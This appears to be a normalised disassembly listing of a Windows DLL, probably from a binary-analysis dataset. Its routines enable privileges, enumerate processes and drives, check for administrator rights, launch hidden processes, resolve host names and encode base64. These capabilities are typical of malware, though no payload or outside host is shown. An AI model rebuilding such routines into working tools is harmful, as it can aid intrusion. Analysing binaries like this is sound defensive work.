imul eax eax 0x230
push eax
mov eax [ ebp - 0x670 ]
push [ eax ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x674 ]
call [ FindClose@IAT ]
push [ ebp - 0x66c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
mov ecx [ ebp - 0x670 ]
mov [ ecx ] eax
inc [ edi ]
mov edi [ edi ]
imul edi edi 0x230
push 0x230
lea edi [ edi + eax - 0x230 ]
push 0x0
push edi
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x66c ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x212 ] 0x5c
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
mov ecx [ ebp - 0x680 ]
add esp 0xc
push edi
push [ ebp - 0x670 ]
lea eax [ ebp - 0x210 ]
push [ ebp - 0x678 ]
push eax
call sub_1000446a
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
push edi
call ebx
xor eax eax
or eax [ ebp - 0x648 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x64c ]
mov [ edi + 0x210 ] eax
xor ebx ebx
or ecx ebx
mov ebx [ wcscpy@IAT ]
mov [ edi + 0x214 ] ecx
mov eax [ ebp - 0x668 ]
mov [ edi + 0x208 ] eax
mov eax [ ebp - 0x664 ]
mov [ edi + 0x218 ] eax
mov eax [ ebp - 0x660 ]
mov [ edi + 0x21c ] eax
mov eax [ ebp - 0x65c ]
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x658 ]
mov [ edi + 0x224 ] eax
mov eax [ ebp - 0x654 ]
mov [ edi + 0x228 ] eax
mov eax [ ebp - 0x650 ]
mov [ edi + 0x22c ] eax
mov edi [ ebp - 0x67c ]
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
sub_100047e4
push ebp
mov ebp esp
push ecx
lea eax [ ebx + 0x8 ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0x4 ] 0x24
jne r-xdata
mov eax [ ebx + 0x20 ]
test eax eax
jne r-xdata
mov edi [ ebx + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
and [ esi + 0x8 ] eax
mov [ ebx + 0x20 ] esi
test edi edi
jne r-xdata
mov eax ecx
and [ esi + 0x8 ] ecx
mov [ eax + 0x8 ] esi
jmp r-xdata
cmp [ edi + 0x4 ] 0x24
jne r-xdata
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
pop edi
leave
retn
mov edi [ edi + 0x8 ]
lea eax [ edi + 0x220 ]
push eax
lea eax [ esi + 0x220 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ edi + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_10004ad0
pop ecx
jmp r-xdata
sub_1000486f
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
lea ebx [ esi + 0x8 ]
push ebx
call [ EnterCriticalSection@IAT ]
jmp r-xdata
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov esi [ esi + 0x20 ]
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
test esi esi
jne r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x20 ] ecx
call sub_10004ad0
pop ecx
xor ecx ecx
cmp [ eax + 0x14 ] edi
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x10 ] ecx
jne r-xdata
mov esi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x8 ] ecx
call sub_10004ad0
pop ecx
jmp r-xdata
xor ecx ecx
cmp [ eax + 0x14 ] edi
sete cl
test ecx ecx
je r-xdata
sub_100048f8
push ebx
push esi
mov esi eax
lea ebx [ esi + 0x8 ]
push ebx
call [ EnterCriticalSection@IAT ]
jmp r-xdata
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax + 0x4 ] edi
jne r-xdata
mov esi [ esi + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x20 ] ecx
call sub_10004ad0
pop ecx
test esi esi
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn
cmp [ eax + 0x4 ] edi
jne r-xdata
mov esi eax
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x8 ] ecx
call sub_10004ad0
pop ecx
jmp r-xdata
sub_10004961
push ebp
mov ebp esp
push ecx
push ecx
push r--data
push [ esi ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
xor eax eax
push 0x4
mov [ ebp - 0x4 ] eax
pop ecx
mov dl [ ebp + eax - 0x5 ]
mov [ ebp + eax - 0x1 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
leave
retn
sub_10004994
push ebp
mov ebp esp
push ecx
push ecx
push r--data
push [ esi ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
xor eax eax
push 0x4
mov [ ebp - 0x4 ] eax
pop ecx
mov dl [ ebp + eax - 0x5 ]
mov [ ebp + eax - 0x1 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
leave
retn
sub_100049c7
push ebp
mov ebp esp
push ecx
push ecx
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax esi
leave
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
and [ ebp - 0x4 ] 0x0
push 0x4
mov [ ebp - 0x8 ] eax
xor eax eax
pop ecx
mov dl [ ebp + eax - 0x5 ]
mov [ ebp + eax - 0x1 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
sub_10004a12
push ebp
mov ebp esp
push ecx
push ecx
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax esi
leave
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
and [ ebp - 0x4 ] 0x0
push 0x4
mov [ ebp - 0x8 ] eax
xor eax eax
pop ecx
mov dl [ ebp + eax - 0x5 ]
mov [ ebp + eax - 0x1 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
sub_10004a5d
push ebp
mov ebp esp
push ecx
push ecx
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax esi
leave
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
and [ ebp - 0x4 ] 0x0
push 0x4
mov [ ebp - 0x8 ] eax
xor eax eax
pop ecx
mov dl [ ebp + eax - 0x5 ]
mov [ ebp + eax - 0x1 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
sub_10004aa8
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
sub_10004af3
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi 0x9c
push esi
lea eax [ ebp - 0xa0 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] esi
mov esi [ GetVersionExA@IAT ]
push eax
call esi
test eax eax
jne r-xdata
cmp [ ebp - 0x90 ] 0x2
pop esi
jne r-xdata
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0xa0 ] 0x94
call esi
xor eax eax
movzx eax [ ebp - 0x9c ]
movzx ecx [ ebp - 0x98 ]
shl ax 0x8
movzx eax ax
or eax ecx
movzx ecx [ ebp - 0xc ]
shl cx 0x8
movzx ecx cx
shl eax 0x10
or eax ecx
movzx ecx [ ebp - 0xa ]
or eax ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
sub_10004b92
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
or eax 0xffffffff
test edx edx
je r-xdata
push 0x400
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
not eax
push ebx
push edi
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor ecx ecx
movzx ebx [ ecx ]
mov edi eax
and edi 0xff
xor edi ebx
shr eax 0x8
xor eax [ esi + edi * 4 ]
inc ecx
dec edx
jne r-xdata
pop edi
pop ebx
xor eax eax
jmp r-xdata
shr edx 0x1
shr edx 0x1
xor edx 0xedb88320
jmp r-xdata
pop esi
pop ebp
retn
test dl 0x1
je r-xdata
mov [ eax + ecx * 4 ] edx
inc ecx
cmp ecx 0x100
jl r-xdata
dec esi
jne r-xdata
push 0x8
mov edx ecx
pop esi
mov [ rw-data ] eax
sub_10004c18
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x18 ]
push eax
push 0x28
mov esi ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push esi
xor esi esi
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x20 ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
push esi
push 0x10
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
mov al 0x1
call [ GetLastError@IAT ]
push [ ebp - 0x18 ]
mov esi eax
call [ CloseHandle@IAT ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
sub_10004cc5
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
xor eax eax
cmp [ esi ] 0x0
je r-xdata
push esi
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push esi
call [ inet_addr@IAT ]
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call [ memcpy@IAT ]
mov eax [ ebp - 0x4 ]
add esp 0xc
jmp r-xdata
leave
retn
cmp eax 0xffffffff
jne r-xdata
sub_10004d09
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp eax edi
jne r-xdata
push edi
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push 0x400
push eax
push edi
push 0x1300
mov [ ebp - 0x4 ] edi
call [ FormatMessageW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor eax eax
cmp [ ebp - 0x4 ] edi
je r-xdata
push [ ebp - 0x4 ]
call [ wcslen@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call sub_10004aa8
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
push [ ebp - 0x4 ]
push esi
call [ wcscpy@IAT ]
pop ecx
pop ecx
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn
sub_10004d70
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax 0xffffffff
jne r-xdata
push esi
push ebx
push eax
call [ GetFileSize@IAT ]
mov esi eax
mov eax [ ebp + 0xc ]
push esi
mov [ eax ] esi
call [ malloc@IAT ]
pop ecx
mov [ edi ] eax
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
lea ecx [ ebp - 0x8 ]
push ecx
push esi
push eax
push [ ebp - 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
xor eax eax
pop ebx
leave
retn
xor ebx ebx
inc ebx
jmp r-xdata
push [ edi ]
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov eax ebx
jmp r-xdata
pop esi
sub_10004df9
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xor esi esi
inc esi
push esi
lea eax [ ebp - 0x24 ]
push eax
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
push esi
lea eax [ ebp - 0x24 ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
push 0x0
push 0x80
lea eax [ ebp - 0x24 ]
push 0x2
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
push esi
push 0x40000000
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0xc
mov [ ebp - 0x8 ] esi
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax esi
call [ GetLastError@IAT ]
xor esi esi
pop esi
pop ebx
leave
retn
sub_10004e87
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edi
xor esi esi
xor eax eax
jmp r-xdata
push 0x0
push esi
push edi
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
pop edi
pop esi
leave
retn
add esi 0x1000
push esi
push [ ebp - 0x4 ]
call [ realloc@IAT ]
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] edi
test edi edi
je r-xdata
push ebx
test eax eax
jns r-xdata
mov ebx [ wcslen@IAT ]
mov esi edi
mov edi r--data
xor esi esi
mov eax [ esi ]
test eax eax
je r-xdata
push edi
call ebx
pop ecx
movzx ecx [ esi + 0x38 ]
add eax eax
cmp ecx eax
jne r-xdata
add esi eax
jne r-xdata
push edi
call ebx
push eax
push [ esi + 0x3c ]
push edi
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x44 ]
test ecx ecx
je r-xdata
mov esi eax
jmp r-xdata
mov edx [ esi + 0x50 ]
mov [ ecx ] edx
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
mov eax esi
pop ebx
sub_10004f32
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
xor ebx ebx
push ebx
push 0x400
mov [ ebp - 0x410 ] ecx
call [ OpenProcess@IAT ]
mov [ ebp - 0x414 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
lea ecx [ ebp - 0x40c ]
push ecx
push 0x8
push eax
mov [ ebp - 0x40c ] ebx
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ GetTokenInformation@IAT ]
lea eax [ ebp - 0x408 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x40c ]
mov [ ebp - 0x408 ] ebx
call esi
test eax eax
jne r-xdata
push [ ebp - 0x414 ]
call [ CloseHandle@IAT ]
pop esi
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push edi
push [ ebp - 0x408 ]
call [ malloc@IAT ]
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
pop edi
lea eax [ ebp - 0x408 ]
push eax
push [ ebp - 0x408 ]
push edi
push 0x1
push [ ebp - 0x40c ]
call esi
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax 0x100
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x418 ] eax
lea eax [ ebp - 0x420 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x204 ]
push eax
push [ edi ]
push ebx
call [ LookupAccountSidW@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x410 ]
push 0x40
lea eax [ ebp - 0x204 ]
push eax
push esi
call [ wcsncpy@IAT ]
xor eax eax
add esp 0xc
mov [ esi + 0x7e ] ax
inc ebx
sub_1000507b
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x48 ] 0x40
call [ GetUserNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call [ _stricmp@IAT ]
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
sub_100050c6
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi eax
lea edx [ esi + edi - 0x2 ]
cmp esi edx
jae r-xdata
mov eax edi
push 0x3
cdq
pop edi
idiv edi
dec edx
je r-xdata
push ebx
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
and eax 0x3
shl eax 0x4
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov [ ecx + 0x2 ] 0x3d3d
dec edx
jne r-xdata
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx ebx [ esi + 0x1 ]
and eax 0x3
add eax eax
shr ebx 0x4
mov al [ ebx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
movzx ebx [ esi + 0x2 ]
and eax 0xf
shr ebx 0x6
mov al [ ebx + eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
movzx eax [ esi + 0x2 ]
and eax 0x3f
mov al [ eax + r--data ]
mov [ ecx + 0x3 ] al
add esi 0x3
add ecx 0x4
cmp esi edx
jb r-xdata
pop ebx
mov eax ecx
sub eax [ ebp + 0x8 ]
pop edi
mov [ ecx ] 0x0
pop esi
pop ebp
retn
movzx eax [ esi ]
shr eax 0x2
mov al [ eax + r--data ]
mov [ ecx ] al
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
and eax edi
add eax eax
shr edx 0x4
mov al [ edx + eax * 8 + r--data ]
mov [ ecx + 0x1 ] al
movzx eax [ esi + 0x1 ]
and eax 0xf
mov al [ eax * 4 + r--data ]
mov [ ecx + 0x2 ] al
mov [ ecx + 0x3 ] 0x3d
jmp r-xdata
add ecx 0x4
sub_100051b5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0x8 ]
jmp r-xdata
cmp bl 0x3d
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
or eax 0xffffffff
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
movsx esi al
shl esi 0x12
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
mov ecx [ ebp - 0x4 ]
movsx eax al
shl eax 0xc
or esi eax
mov eax esi
shr eax 0x10
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
js r-xdata
cmp bl 0x3d
jne r-xdata
movzx eax bl
cmp [ eax + r--data ] 0x0
jge r-xdata
cmp bl 0x3d
jne r-xdata
mov ecx [ ebp - 0x4 ]
movzx eax bl
movsx eax [ eax + r--data ]
shl eax 0x6
or [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0x8
inc [ ebp - 0x4 ]
mov [ ecx ] al
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
mov bl [ edi ]
movzx eax bl
push eax
inc edi
call [ isspace@IAT ]
pop ecx
test eax eax
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp bl 0x3d
je r-xdata
cmp bl 0x3d
je r-xdata
test bl bl
js r-xdata
movzx eax bl
mov al [ eax + r--data ]
test al al
js r-xdata
or al [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov [ ecx ] al
jmp r-xdata
sub_10005306
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ SetErrorMode@IAT ]
push edi
push 0x1
xor ebx ebx
call esi
mov [ ebp - 0x28 ] eax
or eax 0x1
push eax
call esi
xor edi edi
inc edi
cmp edi 0x1a
jl r-xdata
test al 0x10
je r-xdata
lea eax [ edi + 0x41 ]
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x28 ]
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
xor eax eax
inc eax
mov ecx edi
shl eax cl
or ebx eax
sub_1000537e
push ebp
mov ebp esp
sub esp 0x85c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x400
push eax
lea eax [ ebp - 0x804 ]
push eax
call [ wcsncpy@IAT ]
mov esi [ memset@IAT ]
xor eax eax
push 0x10
mov [ ebp - 0x6 ] ax
xor edi edi
lea eax [ ebp - 0x814 ]
push edi
push eax
call esi
push 0x44
lea eax [ ebp - 0x85c ]
push edi
push eax
call esi
add esp 0x24
xor eax eax
mov [ ebp - 0x82c ] ax
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x85c ]
push eax
push edi
push edi
push 0x8000000
push edi
push edi
push edi
lea eax [ ebp - 0x804 ]
push eax
push edi
mov [ ebp - 0x85c ] 0x44
mov [ ebp - 0x830 ] 0x1
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push [ ebp - 0x814 ]
call [ WaitForSingleObject@IAT ]
lea eax [ ebp - 0x818 ]
push eax
push [ ebp - 0x814 ]
call [ GetExitCodeProcess@IAT ]
push [ ebp - 0x810 ]
mov esi [ CloseHandle@IAT ]
test eax eax
jne r-xdata
push 0x64
call esi
push [ ebp - 0x814 ]
call esi
mov eax [ ebp - 0x818 ]
call esi
push [ ebp - 0x814 ]
call esi
push 0x65
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn
pop eax
jmp r-xdata
sub_1000547b
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push 0x2
mov [ ebp - 0x3c ] ebx
call [ ImpersonateSelf@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
lea eax [ ebp - 0x34 ]
push eax
push ebx
push 0x8
mov [ ebp - 0x34 ] ebx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x34 ] ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
jne r-xdata
call [ RevertToSelf@IAT ]
mov eax [ ebp - 0x3c ]
lea eax [ ebp - 0x38 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
cmp [ ebp - 0x34 ] ebx
je r-xdata
push edi
mov edi [ LocalAlloc@IAT ]
push 0x14
push 0x40
call edi
mov [ ebp - 0x40 ] eax
cmp eax ebx
je r-xdata
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
push [ ebp - 0x38 ]
call [ FreeSid@IAT ]
pop edi
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x40 ]
call [ LocalFree@IAT ]
push esi
push [ ebp - 0x38 ]
call [ GetLengthSid@IAT ]
lea esi [ eax + 0x10 ]
push esi
push 0x40
call edi
mov edi eax
mov [ ebp - 0x48 ] edi
cmp edi ebx
je r-xdata
pop esi
push 0x2
push esi
push edi
call [ InitializeAcl@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x48 ]
call [ LocalFree@IAT ]
push [ ebp - 0x38 ]
push 0x3
push 0x2
push edi
call [ AddAccessAllowedAce@IAT ]
test eax eax
je r-xdata
push ebx
push edi
mov edi [ ebp - 0x40 ]
xor esi esi
inc esi
push esi
push edi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
push ebx
push [ ebp - 0x38 ]
push edi
call [ SetSecurityDescriptorGroup@IAT ]
push ebx
push [ ebp - 0x38 ]
push edi
call [ SetSecurityDescriptorOwner@IAT ]
push edi
call [ IsValidSecurityDescriptor@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x34 ]
mov [ ebp - 0x1c ] esi
push edi
mov [ ebp - 0x18 ] 0x2
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x3
mov [ ebp - 0x44 ] 0x14
call [ AccessCheck@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x3c ] ebx
sub_10005639
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
mov [ ebp - 0x10 ] ebx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
xor ecx ebp
pop ebx
call sub_1000eff2
